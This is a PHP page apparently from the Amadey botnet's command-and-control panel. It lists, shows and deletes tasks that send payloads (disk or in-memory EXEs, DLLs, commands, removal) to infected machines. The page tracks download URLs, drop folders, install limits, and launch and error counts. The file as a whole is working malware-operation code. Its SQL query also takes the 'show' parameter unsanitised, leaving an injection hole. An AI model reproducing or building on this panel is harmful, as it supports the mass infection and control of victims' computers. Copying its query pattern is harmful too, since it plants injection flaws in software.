<?php

   session_start();

   error_reporting( 0 );

   if ( $_GET["delete"] )
   {
      include( "Functions.php" );

      if ( !is_numeric( $_GET['id'] ) ) 
      header( "Location: " . $_SERVER['HTTP_REFERER'] . "" );

      if ( $_SESSION['Name'] != "OBSERVER" ) 
      {
         DeleteTask($_GET['id']);
         echo "<meta http-equiv=\"refresh\" content=\"1; url=Show_Tasks.php\">"; 
      }
      else
      {
         include( "Header.php" );
         echo "Observers cant delete task"; 
         include( "Footer.php" );
      }

      exit();
   }

   if ( $_GET["show"] )
   {
      include( "Cfg/Config.php" );
      include( "Functions.php" );
      
      if ( @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] ) == false )
      {
         die;
      }

      echo "<html>
               <head>	
                  <title>Amadey CC</title>	
                  <link rel=\"stylesheet\" type=\"text/css\" href=\"Css\Main.css\">	
                  <link rel=\"stylesheet\" type=\"text/css\" href=\"Css\Style.css\">	
                  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
               </head>";

      sTable();

      mysql_select_db( $conf['dbname'] );

      $result = mysql_query( "SELECT * FROM tasks WHERE `tid` = '" . $_GET["show"] . "' ORDER BY id DESC" );

      echo "<div align = center> 
               <table cellpadding = 1 cellspacing = 1 width = \"98%\" class = table style = \"border: 1px solid;\">
                  <tr>                       
                     <td><div align = center>For unit:</div></td>              
                     <td><div align = center>Url:</div></td>
                     <td><div align = center>PE type:</div></td>
                     <td><div align = center>Arc:</div></td>
                     <td><div align = center>Folder:</div></td>
                     <td><div align = center>Limit:</div></td> 
                     <td><div align = center>Received:</div></td> 
                     <td><div align = center>Launched:</div></td> 
                     <td><div align = center>Download errors:</div></td> 
                     <td><div align = center>Launch errors:</div></td>
                     <td><div align = center>Progress:</div></td>
                     <td><div align = center>Success:</div></td>";
                  echo "</tr>";
                  
      while ( $row = mysql_fetch_array( $result ) )
      {      
         $tid = $row['tid'];
         $url_0 = $row['path'];
         $url_1 = $row['path'];
         $done = $row['loads'];
         $good = $row['exec'];
         $d_err = $row['error'];
         $l_err = $row['error2'];
         $needs = $row['tlimit']; 
         $progress = round( ( $done/$needs ) * 100,1 );
         $success = round( ( $good/$needs ) * 100,1 );

         if ( $row['arc'] == 2 ) 
            $arc = "All";

         if ( $row['arc'] == 0 ) 
            $arc = "x32";

         if ( $row['arc'] == 1 ) 
            $arc = "x64";

         if ( $row['filetype'] == 0 ) 
            $filetype = "EXE (d)";
            
         if ( $row['filetype'] == 1 ) 
            $filetype = "DLL";
            
         if ( $row['filetype'] == 2 ) 
            $filetype = "CMD";

         if ( $row['filetype'] == 3 ) 
            $filetype = "EXE (m)";  

         if ( $row['filetype'] == 9 ) 
            $filetype = "Remove"; 
        
         if ( $row['folder'] == 0 ) 
            $folder = "%Roaming%";
         else 
            $folder = "%Tmp%";

         if ( $row['filetype'] == 3 ) 
            $folder = "memory";

         if ( $row['tlimit'] == "" ) 
            $needs = "*";
         else  
            $needs = $row['tlimit'];

         if ( $row['units'] == "" ) 
            $units = "*";
         else  
            $units = $row['units'];
                 
         if ( strpos( $url_0, ":::" ) )
            $url_0 = substr( $url_0, 0, strpos( $url_0, ":::" ) ) ;

         if ( strpos( $url_1, ":::" ) )
            $url_1 = substr( $url_1, 0, strpos( $url_1, ":::" ) ) ;

         if ( strlen( $url_1 ) > 32 )
            $url_1 = substr( $url_1, 0, 32 ) . "...";  

         $gb = GetBG();

         echo "<tr height=\"80\">";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $units . "</div></td>";
            echo "<td bgcolor = " . $gb . ">" . "<div align = left>" . "<img src=\"Images\Inf_Ico.png\"> " . "<a href=\"" . $url_0 . "\">" . $url_1 . "</a>" . "</div>" . "</td>";
            echo "<td bgcolor = " . $gb . ">" . "<img src=\"Images\Inf_Ico.png\"> " . $filetype . "</td>";
            echo "<td bgcolor = " . $gb . ">" . "<img src=\"Images\Inf_Ico.png\"> " . $arc . "</td>";
            echo "<td bgcolor = " . $gb . ">" . $folder . "</td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $needs . "</div></td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $done . "</div></td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $good . "</div></td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $d_err . "</div></td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $l_err . "</div></td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $progress . "%" . "</div></td>";
            echo "<td bgcolor = " . $gb . "><div align = center>" . $success . "%" . "</div></td>";
         echo "</tr>";
      }

      echo "      </table>
               </div>
            </html>";

      mysql_close();
      exit;
   }

   include( "Header.php" );
   include( "Cfg/Config.php" );
   include( "Cfg/Lang.php" );
   include( "Functions.php" );

   if ( @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] ) == false )
   {
      echo "SQL connection filed, check host, name, login and password";
      die;
   }

   mysql_select_db( $conf['dbname'] );	

   $result = mysql_query( "SELECT * FROM tasks ORDER BY id DESC" );

   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 1px solid;\">
         <tr style=background-color:#11101d; height=\"50\">
            <td>
               <div align = center>
                  <font color=\"#E4E9F7\">" . $lang["_001"] . $_SESSION['Name'] . $lang["_006"] . GetTaskCount() . $lang["_007"] .
                  "</font>
               </div>
            </td>
         </tr>
      </table>";

   sTable();

   echo "<div align = center> 
            <table cellpadding = 1 cellspacing = 1 width = \"98%\" class = table style = \"border: 1px solid;\">
               <tr>                       
                  <td><div align = center></div></td>
                  <td><div align = center>" . $lang["0040"] . ":</div></td>                               
                  <td><div align = center>" . $lang["0044"] . ":</div></td>
                  <td><div align = center>" . $lang["0045"] . ":</div></td> 
                  <td><div align = center>" . $lang["0046"] . ":</div></td> 
                  <td><div align = center>" . $lang["0047"] . ":</div></td> 
                  <td><div align = center>" . $lang["0048"] . ":</div></td>
                  <td><div align = center>".  $lang["0049"] . ":</div></td>
                  <td><div align = center>" . $lang["0050"] . ":</div></td>";

   if ( $_SESSION['Name'] != "OBSERVER" )
   {
      echo "<td><div align = center>" . $lang["0051"] . ":</div></td>";
   }

   echo "</tr>";

   while ( $row = mysql_fetch_array( $result ) )
   {      
      $id = $row['id'];
      $tid = $row['tid'];
      $url_0 = $row['path'];
      $done = $row['loads'];
      $good = $row['exec'];
      $d_err = $row['error'];
      $l_err = $row['error2'];
      $needs = $row['tlimit']; 
      $progress = round( ( $done/$needs ) * 100,1 );
      $success = round( ( $good/$needs ) * 100,1 );

      if ( $row['arc'] == 2 ) 
         $arc = $lang["0066"];

      if ( $row['arc'] == 0 ) 
         $arc = "x32";

      if ( $row['arc'] == 1 ) 
         $arc = "x64";

      if ( $row['filetype'] == 0 ) 
         $filetype = $lang["0067"];

      if ( $row['filetype'] == 1 ) 
         $filetype = $lang["0069"];
         
      if ( $row['filetype'] == 2 ) 
         $filetype = $lang["0070"];

      if ( $row['filetype'] == 3 ) 
         $filetype = $lang["0068"];     

      if ( $row['filetype'] == 9 ) 
         $filetype = $lang["0071"]; 
      
      if ( $row['folder'] == 0 ) 
         $folder = "%Roaming%";
      else 
         $folder = "%Tmp%";

      if ( $row['tlimit'] == "" ) 
         $needs = "*";
      else  
         $needs = $row['tlimit'];

      if ( $row['units'] == "" ) 
         $units = "*";
      else  
         $units = $row['units'];

      $url_1 = $url_0;
               
      if ( strpos( $url_0, ":::" ) )
         $url_0 = substr( $url_0, 0, strpos( $url_0, ":::" ) );

      if ( strpos( $url_1, ":::" ) )
         $url_1 = substr( $url_1, 0, strpos( $url_1, ":::" ) );

      if ( strlen( $url_1 ) > 32 )
         $url_1 = substr( $url_1, 0, 32 ) . "...";  

      $gb = GetBG();

      echo "<tr height=\"80\">";

      echo "<td bgcolor = " . $gb . ">  

      <div align = center><img src=\"Images\Ico_Global.png\"></div>";

      echo "<td bgcolor = " . $gb . ">  
      <table>
         <tr><td>" . $lang["0052"] . ":</td><td></td><td>" . $row['comment'] . "</td></tr>
         <tr><td>" . $lang["0053"] . ":</td><td></td><td>" . "<a href=\"" . $url_0 . "\">" . $url_1 . "</a>" . "</td></tr>
         <tr><td>" . $lang["0006"] . ":</td><td></td><td>" . $units . "</td></tr>
      </table>
      </td>";

      echo "<td bgcolor = " . $gb . ">
      <table>
         <tr><td>" . $lang["0054"] . ":</td><td></td><td>" . $filetype . "</td></tr>
         <tr><td>" . $lang["0055"] . ":</td><td></td><td>" . $arc . "</td></tr>" ;

         if ($filetype != $lang["0071"] && $filetype != $lang["0068"])
         {
            echo "<tr><td>" . $lang["0056"] . ":</td><td></td><td>" . $folder . "</td></tr>";
         } 

      echo "</table>
      </td>";

      echo "<td bgcolor = " . $gb . "><div align = center>" . $done . $lang["0155"] . $needs . "</div></td>";
      echo "<td bgcolor = " . $gb . "><div align = center>" . $good . "</div></td>";
      echo "<td bgcolor = " . $gb . "><div align = center>" . $d_err . "</div></td>";
      echo "<td bgcolor = " . $gb . "><div align = center>" . $l_err . "</div></td>";
      echo "<td bgcolor = " . $gb . "><div align = center>" . $progress . "%" . "</div></td>";
      echo "<td bgcolor = " . $gb . "><div align = center>" . $success . "%" . "</div></td>";

      if ( $_SESSION['Name'] != "OBSERVER" ) 
      {
         echo "<td bgcolor = " . $gb . ">
         <table>
            <tr><td>" . "<img src=\"Images\Version.png\"> " . "</td><td></td><td>"  . "<a href=\"Edit_Task.php?id=" . $id . "\">" . $lang["0057"] . "</a>". "</td></tr>
            <tr><td>" . "<img src=\"Images\Version.png\"> " . "</td><td></td><td>" . "<a href=\"Show_Tasks.php?show=" . $tid . "\">" . $lang["0058"] . "</a>" . "</td></tr>
            <tr><td>" . "<img src=\"Images\Rem.png\"> " . "</td><td></td><td>" . "<a href=\"Show_Tasks.php?delete=1&id=" . $id . "\">" . $lang["0059"] ."</a>" . "</td></tr>
         </table>
         </td>";       
      }

   echo "</tr>";
   }

   echo "   </table>
         </div>";

   sTable();

   include( "Footer.php" );

   mysql_close();

?>